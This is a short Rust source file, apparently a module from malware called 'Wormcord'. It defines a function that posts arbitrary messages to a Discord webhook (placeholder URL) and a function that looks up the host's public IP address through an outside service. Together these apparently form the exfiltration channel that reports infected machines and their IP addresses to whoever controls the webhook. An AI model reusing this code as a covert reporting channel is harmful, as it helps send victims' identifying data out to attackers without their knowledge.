use ureq;

const DISCORD_WEBHOOK_URL: &'static str = "WEBHOOK_URL";

pub fn send_web_hook_message(message: &str) {
    let _result = ureq::post(DISCORD_WEBHOOK_URL)
        .send_form(&[("username", "Wormcord"), ("content", message)]);
}

pub fn get_ip_address() -> String {
    const API_ENDPOINT: &'static str = "https://wtfismyip.com/text";
    let result = ureq::get(API_ENDPOINT).call();
    result.into_string().unwrap()
}